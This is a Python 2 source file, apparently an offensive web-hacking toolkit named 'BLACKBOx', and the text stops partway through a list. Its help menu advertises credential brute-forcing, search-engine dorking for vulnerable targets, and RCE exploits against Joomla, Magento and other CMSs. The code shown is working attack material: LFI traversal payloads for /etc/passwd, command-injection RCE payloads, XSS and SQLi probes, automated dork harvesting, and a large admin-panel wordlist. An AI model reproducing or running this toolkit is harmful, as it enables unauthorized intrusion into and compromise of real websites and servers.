#!/usr/bin/python2
#-*- coding:utf-8 -*-
################################################################################################################################
###                                          I edit some tools from other repository like :                                  ###
### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/                                                                 ###
### MAGENTO RCE : https://www.exploit-db.com/exploits/37977/                                                                 ###
### PRESTASHOP EXPLOIT : http://0day.today/exploit/25260 , http://0day.today/exploit/25261 , http://0day.today/exploit/25259 ###
### ADMIN PAGE FINDER  : https://packetstormsecurity.com/files/112855/Admin-Page-Finder-Script.html                          ###
### XSS/SQLI/RCE SCANNER FROM : https://github.com/zigoo0/webpwn3r !                                                         ###
### EXPLOIT                   : https://github.com/XiphosResearch                                                            ###
################################################################################################################################
import requests,json,sys,time,re,os,base64 ,random,hashlib,timeit,ftplib,pexpect,urllib2,urllib
from sys import platform
from time import gmtime, strftime
from optparse import OptionParser
from passlib.hash import nthash
from urllib import FancyURLopener
from passlib.hash import mssql2000 as m20,oracle11 as oracle11,mssql2005 as m25, mysql323, mysql41
from pexpect import pxssh
from ftplib import FTP
__author__     = 'Saad Hat'
__github__     = 'https://bitbucket.org/darkeye/'
__emailadd__   = 'blackdoor197@riseup.net'
__twitter__    = 'https://twitter.com/S44DH4T'
__version__    = '2.2'
__license__    = 'GPLv2'
__scrname__    = 'BLACKBOx v%s' % (__version__)

def __banner__():
	print color.R+color.BOLD+""" _____ __    _____ _____ _____ _____ _____ __ __ 
| __  |  |  |  _  |     |  |  | __  |     |  |  |
| __ -|  |__|     |   --|    -| __ -|  |  |-   -|
|_____|_____|__|__|_____|__|__|_____|_____|__|__|"""
	print (color.W+color.BOLD+"                                                {"+color.R+__version__+"#Dev"+color.W+"}"+color.ENDC)

def __help__():
	print (color.W+color.BOLD+"Usage   : "+color.W+sys.argv[0]+color.R+" {Module}"+color.W+" -h/--help"+color.ENDC)
	print (color.BOLD+color.Y+"Bruteforcing : "+color.ENDC)
	print (color.W+"\t+ Wordpress Bruteforce : wordpress_brute | Bruteforcing WP PANEL")
	print (color.W+"\t+ Admin Page Finder    : admin_brute     | Find Admin Page")
	print (color.W+"\t+ SSH Bruteforce       : ssh_brute       | Bruteforcing SSH LOGIN")
	print (color.W+"\t+ FTP Bruteforce       : ftp_brute       | Bruteforcing FTP LOGIN")
	print (color.W+color.BOLD+color.Y+"Information Gathering : "+color.ENDC)
	print (color.W+"\t+ Dnsinfo : dns_info               | Get All Website from IP")
	print (color.W+color.BOLD+color.Y+"Exploit : "+color.ENDC)
	print (color.W+"\t+ Joomla Rce           : rce_joomla       | 1.5 - 3.4.5 remote code execution")
	print (color.W+"\t+ Magento Rce          : rce_magento      | Magento eCommerce - Remote Code Execution")
	print (color.W+"\t+ PrestaShop Exploit   : presta_exploit   | Prestashop Multi Modules Arbitrary File Upload Exploit")
	print (color.W+"\t+ PhpmoAdmin Rce       : rce_pmo          | Exploit for phpMoAdmin, {CVE-2015-2208")
	print (color.W+"\t+ ElasticSearch rce    : rce_elastic      | Exploit for ElasticSearch , {CVE-2015-1427}")
	print (color.W+"\t+ LotusCMS Rce         : rce_lotus        | LotusCMS 3.0 Unauthenticated Remote Code Execution")
	print (color.W+"\t+ WPNmedia upload vuln : wp_nmedia        | Wordpress N-Media Website Contact Form with File Upload 1.3.4")
	print (color.W+"\t+ WPSHOP upload vuln   : wp_shop          | Wordpress WPShop eCommerce Shell Upload (WPVDB-7830)")
	print (color.W+color.BOLD+color.Y+"Dorking : "+color.ENDC)
	print (color.W+"\t+ Google Dorker : google_dorker(LFI/RCE/XSS/SQLi) | Google Dorker ")
	print (color.W+"\t+ Bing Dorker   : bing_dorker(LFI/RCE/XSS/SQLi)   | Bing Dorker via IP")
	print (color.W+"\t+ Scan List     : scan_list(LFI/RCE/XSS/SQLi)     | Scan url in list !")
	print (color.W+color.BOLD+color.Y+"Cracking : "+color.ENDC)
	print (color.W+"\t+ Crack Hash MD5-SHA512 : hash_killer            | Crack Hash\n\t\t     SHA1-SHA224\n\t\t     SHA256-SHA384\n\t\t     MSSQL2000-MSSQL2005\n\t\t     MYSQL41-ORACLE11\n\t\t     MYSQL323 HASHs")

def __update__():
	pass

class color:
	P    =  '\033[95m' # purple
	B    =  '\033[94m' # Blue
	BOLD =  '\033[1m'  # Bold
	G    =  '\033[92m' # Green
	Y    =  '\033[93m' # Yellow
	R    =  '\033[91m' # Red
	W    =  '\033[97m' # White
	BL   =  '\033[90m' # Black
	M    =  '\033[95m' # Magenta
	C    =  '\033[96m' # Cyan
	ENDC =  '\033[0m'  # end colors
	if sys.platform == 'win32':
		P    =  '' # purple
		B    =  '' # Blue
		BOLD =  '' # Bold
		G    =  '' # Green
		Y    =  '' # Yellow
		R    =  '' # Red
		W    =  '' # White
		BL   =  '' # Black
		M    =  '' # Magenta
		C    =  '' # Cyan
		ENDC =  '' # end colors


###
###SCANNER TOOLS
###
####################################
##                                ##
##       LFI/SQLI/RCE/XSS         ##
##                                ##
####################################
class UserAgent(FancyURLopener):
    version = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0'
useragent = UserAgent()
class HTTP_HEADER:
    HOST = "Host"
    SERVER = "Server"


class scanner:
	burl,gurl = [],[]
	def headers_reader(self,url):
		print color.BOLD+"\t[!] Fingerprinting the backend Technologies."+color.ENDC
		opener = urllib.urlopen(url)
		if opener.code == 200:
			print color.G+"\t[!] Status code: 200 OK"+color.ENDC
		if opener.code == 404:
			print color.R+"\t[!] Page was not found! Please check the URL \n"+color.ENDC
			exit()
		Server = opener.headers.get(HTTP_HEADER.SERVER)
		Host = url.split("/")[2]
		print color.G+"\t[!] Host: " + str(Host) +color.ENDC
		print color.G+"\t[!] WebServer: " + str(Server) +color.ENDC
		for item in opener.headers.items():
			for powered in item:
				sig = "x-powered-by"
				if sig in item:
					print color.G+ "\t[!] " + str(powered).strip() + color.ENDC
	def lfi(self, url):
		payloads=["../etc/passwd","../etc/passwd%00","../../etc/passwd","../../etc/passwd%00","../../../etc/passwd","../../../etc/passwd%00","../../../../etc/passwd","../../../../etc/passwd%00","../../../../../etc/passwd","../../../../../etc/passwd%00","../../../../../../etc/passwd","../../../../../../etc/passwd%00","../../../../../../../etc/passwd","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd%00","..%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd%2500","..%2F..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
		lfi = re.findall(r'=(.*)', url)
		for i in lfi:
			print (color.R+color.BOLD+"{+} "+color.W+"TARGET : "+url+color.ENDC)
			l=re.sub(i, '', url)
			vuln = 0
			for payload in payloads:
				payload=payload.strip()
				print (color.G+color.BOLD+"\t{+} "+color.W+" Payload : "+payload+color.ENDC)
				lfii = l+payload
				r = requests.get(lfii,verify=False)
				html = r.content
				if "root" in html:
					print (color.R+color.BOLD+"\t{+} "+color.R+" LFI FOUND : "+lfii+color.ENDC)
					vuln+=1
				else:
					print (color.B+color.BOLD+"\t{+} "+color.B+" NOT FOUND : "+lfii+color.ENDC)
					pass
			print color.W+"[!] %i LFI FOUNDED " % (vuln) +color.ENDC
	def run(self,url, payloads, check):
		opener = requests.get(url, verify=False)
		vuln = 0
		print color.B+"{+} "+color.W+"Target : "+url+color.ENDC
		#print color.B+"\t{+} "+color.W+"IP   : "+socket.gethostbyname(url)+color.ENDC
		if opener.status_code == 999:
			print color.R +" [~] WebKnight WAF Detected!"+color.ENDC
			print color.R +" [~] Delaying 3 seconds between every request"+color.ENDC
			time.sleep(3)
		if "&" in url:
			for params in url.split("?")[1].split("&"):
				for payload in payloads:
					bugs = url.replace(url, url + str(payload).strip())
					request = useragent.open(bugs)
					html = request.readlines()
					for line in html:
						checker = re.findall(check, line)
						if len(checker) !=0:
							print color.R+"\t[*] Payload : " ,payload +color.ENDC
							print color.B+"\t[*] FOUND   : "+color.ENDC + bugs
							vuln +=1
		else:
				for payload in payloads:
					bugs = url.replace(url, url + str(payload).strip())
					request = useragent.open(bugs)
					html = request.readlines()
					for line in html:
						checker = re.findall(check, line)
						if len(checker) !=0:
							print color.R+"\t[*] Payload : " ,payload +color.ENDC
							print color.B+"\t[*] FOUND   : "+color.ENDC + bugs
							vuln +=1
		if vuln == 0:
			print color.G+"\t[!] Target is not vulnerable!"+color.ENDC
		else:
			print color.C+"\t[!]  %i bugs :-) " % (vuln) +color.ENDC
	def rce(self,url):
		self.headers_reader(url)
		payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
		payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
		payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
		check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
		self.run(url, payloads, check)
	def xss(self,url):
		payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
		payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
		check = re.compile('zigoo0<svg|x>x', re.I)
		self.run(url, payloads, check)
	def sqli(self,url):
		payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
		check = re.compile("SQL syntax|Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
		self.run(url, payloads, check)

###
###DORKING TOOLS
###
####################################
##                                ##
##            DORKER              ##
##                                ##
####################################
class dorker:
	gurl,burl=[],[]
	def google(self, dork, start, stop):
		from cookielib import LWPCookieJar
		from urllib2 import Request, urlopen
		from urlparse import urlparse, parse_qs
		home_folder = os.getenv('HOME')
		if not home_folder:
			home_folder = os.getenv('USERHOME')
			if not home_folder:
				home_folder = '.'
		cookie_jar = LWPCookieJar(os.path.join(home_folder, '.google-cookie'))
		try:
			cookie_jar.load()
		except Exception:
			pass
		def randomm():
			tld = ['ae', 'am', 'as', 'at','az', 'ba', 'be', 'bg','bi', 'bs', 'ca', 'cd','cg', 'ch', 'ci', 'cl','co.bw', 'co.ck', 'co.cr', 'co.hu','co.id', 'co.il', 'co.im', 'co.in','co.je', 'co.jp', 'co.ke', 'co.kr','co.ls', 'co.ma', 'co.nz', 'co.th','co.ug', 'co.uk', 'co.uz', 'co.ve','co.vi', 'co.za', 'co.zm', 'com','com.af', 'com.ag', 'com.ar', 'com.au','com.bd', 'com.bo', 'com.br', 'com.bz','com.co', 'com.cu', 'com.do', 'com.ec','com.eg', 'com.et', 'com.fj', 'com.gi','com.gt', 'com.hk', 'com.jm', 'com.kw','com.ly', 'com.mt', 'com.mx', 'com.my','com.na', 'com.nf', 'com.ni', 'com.np','com.om', 'com.pa', 'com.pe', 'com.ph','com.pk', 'com.pr', 'com.py', 'com.qa','com.sa', 'com.sb', 'com.sg', 'com.sv','com.tj', 'com.tr', 'com.tw', 'com.ua','com.uy', 'com.uz', 'com.vc', 'com.vn','cz', 'de', 'dj', 'dk','dm', 'ee', 'es', 'fi','fm', 'fr', 'gg', 'gl','gm', 'gr', 'hn', 'hr','ht', 'hu', 'ie', 'is','it', 'jo', 'kg', 'kz','li', 'lk', 'lt', 'lu','lv', 'md', 'mn', 'ms','mu', 'mw', 'net','nl','no', 'nr', 'nu', 'pl','pn', 'pt', 'ro', 'ru','rw', 'sc', 'se', 'sh','si', 'sk', 'sm', 'sn','tm', 'to', 'tp', 'tt','uz', 'vg', 'vu', 'ws']
			tld_rand = random.sample(tld, 1)
			for tldd in tld_rand:
				return tldd
		def html(url):
			request = Request(url)
			request.add_header('User-Agent',
				'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)')
			cookie_jar.add_cookie_header(request)
			response = urlopen(request)
			cookie_jar.extract_cookies(response, request)
			html = response.read()
			response.close()
			cookie_jar.save()
			return html
		def run(dork, start, stop):
			tldd = randomm()
			while start<stop:
				url = "http://www.google."+tldd+"/search?q="+dork+"&start="+str(start)+"&inurl=https"
				htmll = html(url)
				link = re.findall(r'<h3 class="r"><a href="(.*?)"',htmll)
				for i in link:
					i=i.strip()
					o = urlparse(i, 'http')
					gopen = open("gurl.txt","a")
					if i.startswith('/url?'):
						link = parse_qs(o.query)['q'][0]
						self.gurl.append(link)
						gopen.write(str(link+"\n"))
				start+=10
			print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" "+str(len(self.gurl))+" FOUND")
		tldd = randomm()
		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tldd)
		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC)
		run(dork, start, stop)
	def bing_ip(self, ip,dork):
		url = []
		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" DORK          :  "+dork)
		page = 0
		bopen = open("burl.txt","a")
		while page <= 102:
			bing ='http://www.bing.com/search?q=ip:'+ip+'+'+dork+'&count=50&first='+str(page)
			get = requests.get(bing)
			html = get.content
			link = re.findall(r'<h2><a href="(.*?)"', html)
			for i in link:
				url.append(i)
				self.burl.append(i)
				bopen.write(i+"\n")
			page += 50
		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC)
	def bing(self,dork):
		url = []
		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" DORK          :  "+dork)
		page = 0
		bopen = open("burl.txt","a")
		while page <= 102:
			bing ='http://www.bing.com/search?q='+dork+'&count=50&first='+str(page)
			get = requests.get(bing)
			html = get.content
			link = re.findall(r'<h2><a href="(.*?)"', html)
			for i in link:
				url.append(i)
				self.burl.append(i)
				bopen.write(i+"\n")
			page += 50
		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC)
	pass

class admin_finder:
    php = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
    'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
    'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
    'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
    'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
    'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
    'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
    'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
    'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
    'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php']
    asp = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
    'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
    'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
    'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
    'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
    'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
    'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
    'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
    'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
    'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
    'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
    'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
    'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
    'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
    'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html']
    cfm = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
    'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
    'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
    'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
    'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
    'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
    'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
    'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
    'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
    'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm']
    js = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
    'memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js','admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
    'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
    'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
    'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
    'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
    'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
    'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js']
    cgi = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
    'memberadmin/','administratorlogin/','adm/','admin/account.cgi','admin/index.cgi','admin/login.cgi','admin/admin.cgi','admin/account.cgi',
    'admin_area/admin.cgi','admin_area/login.cgi','siteadmin/login.cgi','siteadmin/index.cgi','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.cgi','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
    'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
    'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
    'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
    'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
    'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
    'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi']
    brf = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
    'memberadmin/','administratorlogin/','adm/','admin/account.brf','admin/index.brf','admin/login.brf','admin/admin.brf','admin/account.brf',
    'admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
